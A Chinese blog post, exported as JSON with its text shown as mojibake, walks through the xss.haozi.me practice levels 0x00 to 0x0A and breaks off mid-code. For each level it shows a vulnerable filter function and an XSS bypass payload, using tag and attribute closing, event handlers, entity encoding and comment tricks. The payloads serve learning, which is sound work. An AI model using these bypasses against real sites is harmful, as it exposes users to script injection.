{"title":"XSSå¸¸è§ç»•è¿‡å§¿åŠ¿å’Œç»•æŸç‹—WAFæ‰€ç”¨æ ‡ç­¾å°è®°","uid":"ff5ef1580e1509b5812626f28a444a2d","slug":"XSS.haozi.meåˆ·é¢˜","date":"2022-07-11T10:32:20.000Z","updated":"2024-02-14T08:02:06.000Z","comments":true,"path":"api/articles/XSS.haozi.meåˆ·é¢˜.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141602387.jpeg","content":"<h1 id=\"å‰è¨€\"><a href=\"#å‰è¨€\" class=\"headerlink\" title=\"å‰è¨€\"></a>å‰è¨€</h1><p>XSSå­¦ä¹ è¿‡åï¼Œæƒ³åˆ·ä¸€äº›é¢˜ï¼Œgithubæ‰¾åˆ°ä¸€ä¸ªï¼Œé“¾æ¥å¦‚ä¸‹<br><a href=\"https://xss.haozi.me/\">https://xss.haozi.me/</a></p>\n<h2 id=\"0X00\"><a href=\"#0X00\" class=\"headerlink\" title=\"0X00\"></a>0X00</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token char\">'&lt;div>'</span> <span class=\"token operator\">+</span> input <span class=\"token operator\">+</span> <span class=\"token char\">'&lt;/div>'</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537199.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"><br>çœ‹åˆ°æœåŠ¡ç«¯æ˜¯æ²¡æœ‰ä»»ä½•é˜²æŠ¤çš„ï¼Œç›´æ¥ç®€å•çš„xssè¯­å¥å³å¯</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537291.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X01\"><a href=\"#0X01\" class=\"headerlink\" title=\"0X01\"></a>0X01</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> '<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>textarea<span class=\"token punctuation\">></span></span>' <span class=\"token operator\">+</span> input <span class=\"token operator\">+</span> '<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>textarea<span class=\"token operator\">></span>'\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537243.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"><br>å‘ç°å‰åå¤šäº†ä¸ª<code>&lt;textarea&gt;</code>æ ‡ç­¾ï¼Œé‚£æˆ‘ä»¬è¿™é‡Œçš„è¯ï¼Œç›´æ¥æŠŠå‰é¢ç»™é—­åˆäº†ï¼Œåé¢å°±å¯æ§äº†ï¼Œæ­¤æ—¶å†æ’å…¥æˆ‘ä»¬çš„xssè¯­å¥å³å¯</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>textarea<span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537226.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X02\"><a href=\"#0X02\" class=\"headerlink\" title=\"0X02\"></a>0X02</h2><h3 id=\"æ–¹æ³•ä¸€\"><a href=\"#æ–¹æ³•ä¸€\" class=\"headerlink\" title=\"æ–¹æ³•ä¸€\"></a>æ–¹æ³•ä¸€</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> '<span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span><span class=\"token string\">\"name\"</span> value<span class=\"token operator\">=</span><span class=\"token string\">\"' + input + '\"</span><span class=\"token operator\">></span>'\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537249.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"><br>è¿™é¢˜çš„è¯çœ‹åç«¯ä»£ç æ˜¯æŠŠå€¼åŠ åˆ°valueé‡Œäº†ï¼ŒåŒæ—¶æŠŠè¿™ä¸ªé™åˆ¶åˆ°äº†inputé‡Œï¼Œé‚£æˆ‘ä»¬è¿™é‡Œå¯ä»¥æŠŠvalueé—­åˆï¼ŒæŠŠinputæ ‡ç­¾ä¹Ÿé—­åˆï¼Œç„¶åå†™å…¥è‡ªå·±çš„è¯­å¥ï¼Œæ­¤æ—¶å³å¯å®ç°xss</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">\"<span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537319.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h3 id=\"æ–¹æ³•äºŒ\"><a href=\"#æ–¹æ³•äºŒ\" class=\"headerlink\" title=\"æ–¹æ³•äºŒ\"></a>æ–¹æ³•äºŒ</h3><p>inputè¯­å¥ä¸­ä¹Ÿå¯ä»¥å®ç°xssï¼Œæˆ‘ä»¬æŠŠvalueé—­åˆåï¼Œå¯ä»¥æ·»åŠ onclickå±æ€§ï¼Œæ¥å®ç°xssï¼Œæ„é€ payloadå¦‚ä¸‹</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token string\">\" onclick=\"</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537965.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X03\"><a href=\"#0X03\" class=\"headerlink\" title=\"0X03\"></a>0X03</h2><h3 id=\"å®ä½“ç¼–ç ç»•è¿‡\"><a href=\"#å®ä½“ç¼–ç ç»•è¿‡\" class=\"headerlink\" title=\"å®ä½“ç¼–ç ç»•è¿‡\"></a>å®ä½“ç¼–ç ç»•è¿‡</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">const</span> stripBracketsRe <span class=\"token operator\">=</span> <span class=\"token operator\">/</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">/</span>g\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>stripBracketsRe<span class=\"token punctuation\">,</span> ''<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> input\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537010.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"><br><code>/g</code>ä¿®é¥°ç¬¦ç”¨äºæ‰§è¡Œå…¨å±€åŒ¹é…ï¼ˆæŸ¥æ‰¾æ‰€æœ‰åŒ¹é…è€Œéåœ¨æ‰¾åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…ååœæ­¢ï¼‰ã€‚<br>æ€»ä¹‹è¿™é‡Œçš„è¿‡æ»¤å°±æ˜¯è¿‡æ»¤äº†<code>()</code>ï¼Œè¿™ä¸ªæ—¶å€™çš„è¯æˆ‘ä»¬çš„æ€è·¯æœ‰ä¸€ä¸ªå°±æ˜¯ç¼–ç ç»•è¿‡ï¼Œæˆ‘ä»¬çš„å±æ€§åœ¨æ ‡ç­¾ä¸­ï¼Œåœ¨è§¦å‘å‰å°±å¯¹å…¶è¿›è¡Œäº†ä¸€æ¬¡è§£ç ï¼Œå› æ­¤æˆ‘ä»¬è¿™é‡Œå¯ä»¥è¿›è¡Œç¼–ç ç»•è¿‡ï¼Œæ„é€ payloadå¦‚ä¸‹</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>javascript<span class=\"token operator\">:</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">97</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">108</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">101</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">114</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">116</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">40</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">49</span><span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#<span class=\"token number\">41</span><span class=\"token operator\">></span><span class=\"token number\">123</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>a<span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537045.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h3 id=\"åå¼•å·ç»•è¿‡\"><a href=\"#åå¼•å·ç»•è¿‡\" class=\"headerlink\" title=\"åå¼•å·ç»•è¿‡\"></a>åå¼•å·ç»•è¿‡</h3><p>å¯ä»¥ç”¨`æ¥ä»£æ›¿æ‹¬å·ï¼Œæ„é€ payloadå¦‚ä¸‹</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span>alert`<span class=\"token number\">1</span>`<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537181.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X04\"><a href=\"#0X04\" class=\"headerlink\" title=\"0X04\"></a>0X04</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">const</span> stripBracketsRe <span class=\"token operator\">=</span> <span class=\"token operator\">/</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>`<span class=\"token punctuation\">]</span><span class=\"token operator\">/</span>g\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>stripBracketsRe<span class=\"token punctuation\">,</span> ''<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> input\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>ç›¸æ¯”ä¸Šå…³å¤šè¿‡æ»¤äº†åå¼•å·ï¼Œè¿™é‡Œæ²¿ç”¨ä¸Šå…³æ€è·¯å³å¯ï¼Œç¼–ç ç»•è¿‡</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span>javascript<span class=\"token operator\">:</span><span class=\"token operator\">&amp;</span>#x61<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x6c<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x65<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x72<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x74<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x28<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x31<span class=\"token punctuation\">;</span><span class=\"token operator\">&amp;</span>#x29<span class=\"token punctuation\">;</span><span class=\"token operator\">></span><span class=\"token number\">123</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537390.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X05\"><a href=\"#0X05\" class=\"headerlink\" title=\"0X05\"></a>0X05</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">--</span><span class=\"token operator\">></span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'ğŸ˜‚'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> <span class=\"token char\">'&lt;!-- '</span> <span class=\"token operator\">+</span> input <span class=\"token operator\">+</span> <span class=\"token char\">' -->'</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>è¿™é‡ŒæŠŠå†…å®¹éƒ½ç»™æ³¨é‡Šäº†ï¼Œæ¯‹åº¸ç½®ç–‘è¿™é‡Œæˆ‘ä»¬éœ€è¦é—­åˆè¿™ä¸ªæ³¨é‡Šç¬¦ï¼Œä½†æ˜¯è¿‡æ»¤äº†<code>--&gt;</code>ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜å¯ä»¥ç”¨<code>--!&gt;</code>æ¥è¿›è¡Œé—­åˆï¼Œæ„é€ payloadå¦‚ä¸‹</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">--</span><span class=\"token operator\">!</span><span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537532.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X06\"><a href=\"#0X06\" class=\"headerlink\" title=\"0X06\"></a>0X06</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span>auto<span class=\"token operator\">|</span>on<span class=\"token punctuation\">.</span>*<span class=\"token operator\">=</span><span class=\"token operator\">|</span><span class=\"token operator\">></span><span class=\"token operator\">/</span>ig<span class=\"token punctuation\">,</span> <span class=\"token char\">'_'</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> `<span class=\"token operator\">&lt;</span>input value<span class=\"token operator\">=</span><span class=\"token number\">1</span> $<span class=\"token punctuation\">&#123;</span>input<span class=\"token punctuation\">&#125;</span> type<span class=\"token operator\">=</span><span class=\"token string\">\"text\"</span><span class=\"token operator\">></span>`\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>è¿™é‡Œçš„è¯å¯ä»¥çœ‹è§æ˜¯è¿‡æ»¤äº†<code>auto.*=</code>å’Œ<code>on.*=</code>ä»¥åŠ<code>&gt;</code>ï¼Œé˜²æŠ¤çš„å¾ˆå¥½ï¼Œä½†ä»å­˜åœ¨ä¸€äº›æ¼æ´ï¼Œå°±æ˜¯è¿™ä¸ªä»–è¿‡æ»¤çš„è¿™ä¸ªå±æ€§å’Œ<code>=</code>æ˜¯æ— ç¼è¡”æ¥çš„ï¼Œå¦‚æœæˆ‘ä»¬è¿›è¡Œæ¢è¡Œï¼Œè®©ä»–ä¸æ»¡è¶³è¿™ä¸ªè¿‡æ»¤æ¡ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªè¿‡æ»¤ä¸åŠ æ— æ•ˆäº†å—ï¼Œæ„é€ payloadå¦‚ä¸‹</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">onclick\n<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537903.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X07\"><a href=\"#0X07\" class=\"headerlink\" title=\"0X07\"></a>0X07</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">const</span> stripTagsRe <span class=\"token operator\">=</span> <span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span>\\<span class=\"token operator\">/</span><span class=\"token operator\">?</span><span class=\"token punctuation\">[</span><span class=\"token operator\">^</span><span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">/</span>gi\n\n  input <span class=\"token operator\">=</span> input<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span>stripTagsRe<span class=\"token punctuation\">,</span> ''<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> `<span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>article<span class=\"token punctuation\">></span></span>$<span class=\"token punctuation\">&#123;</span>input<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>article<span class=\"token operator\">></span>`\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>è¿™é‡Œçš„è¯ä¸éš¾çœ‹å‡ºæ˜¯è¿‡æ»¤äº†<code>&lt;&gt;</code>è¿™ä¸ªæ ‡ç­¾ï¼Œä½†å•ä¸ªçš„<code>&lt;</code>å’Œ<code>&gt;</code>ä»æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥å€ŸåŠ©æ³¨é‡Šç¬¦æ¥å®ç°é—­åˆï¼Œæ„é€ payloadå¦‚ä¸‹</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span>img src<span class=\"token operator\">=</span><span class=\"token number\">1</span> onerror<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537971.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X08\"><a href=\"#0X08\" class=\"headerlink\" title=\"0X08\"></a>0X08</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  src <span class=\"token operator\">=</span> src<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&lt;</span>\\<span class=\"token operator\">/</span>style<span class=\"token operator\">></span><span class=\"token operator\">/</span>ig<span class=\"token punctuation\">,</span> '<span class=\"token comment\">/* \\u574F\\u4EBA */</span>'<span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> `\n    <span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>style<span class=\"token punctuation\">></span></span>\n      $<span class=\"token punctuation\">&#123;</span>src<span class=\"token punctuation\">&#125;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style<span class=\"token operator\">></span>\n  `\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>è¿‡æ»¤äº†<code>&lt;/style&gt;</code>ï¼ŒåŒä¹‹å‰ç±»ä¼¼ï¼Œå¯é‡‡ç”¨ç©ºæ ¼å’Œæ¢è¡Œç»•è¿‡</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style <span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style\n<span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537031.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X09\"><a href=\"#0X09\" class=\"headerlink\" title=\"0X09\"></a>0X09</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  let domainRe <span class=\"token operator\">=</span> <span class=\"token operator\">/</span><span class=\"token operator\">^</span>https<span class=\"token operator\">?</span><span class=\"token operator\">:</span>\\<span class=\"token operator\">/</span>\\<span class=\"token operator\">/</span>www\\<span class=\"token punctuation\">.</span>segmentfault\\<span class=\"token punctuation\">.</span>com<span class=\"token operator\">/</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>domainRe<span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> `<span class=\"token operator\">&lt;</span>script src<span class=\"token operator\">=</span><span class=\"token string\">\"$&#123;input&#125;\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span>`\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> '<span class=\"token class-name\">Invalid</span> URL'\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>è¿™é‡Œçš„è¦æ±‚å°±æ˜¯inputçš„éœ€è¦å«æœ‰<code>https://www.segmentfault.com</code>ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬çœ‹è¯­å¥çš„è¯ï¼Œå‘ç°å®ƒæ˜¯è¢«ä¸€å¯¹åŒå¼•å·åŒ…è£¹çš„ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªåŒå¼•å·å°±å¯ä»¥å®ç°è‡ªç”±æ’å…¥å±æ€§ï¼Œä½†æ­¤æ—¶æ˜¯ä¸èƒ½å¤Ÿxssçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å†é—­åˆæ ‡ç­¾ï¼Œå³æ·»åŠ <code>&quot;&gt;&lt;/script&gt;</code>æ¥é—­åˆï¼Œè€Œåæ·»åŠ æˆ‘ä»¬çš„è¯­å¥å³å¯</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">https<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>www<span class=\"token punctuation\">.</span>segmentfault<span class=\"token punctuation\">.</span>com<span class=\"token string\">\">&lt;/script>&lt;img src=\"</span>\" onerror<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span>\nhttps<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>www<span class=\"token punctuation\">.</span>segmentfault<span class=\"token punctuation\">.</span>com\"<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>script<span class=\"token punctuation\">></span></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202402141537396.png\" alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\"></p>\n<h2 id=\"0X0A\"><a href=\"#0X0A\" class=\"headerlink\" title=\"0X0A\"></a>0X0A</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">function render <span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  function <span class=\"token function\">escapeHtml</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token operator\">&amp;</span><span class=\"token operator\">/</span>g<span class=\"token punctuation\">,</span> <span class=\"token char\">'&amp;amp;'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token operator\">/</span><span class=\"token char\">'/g, '</span><span class=\"token 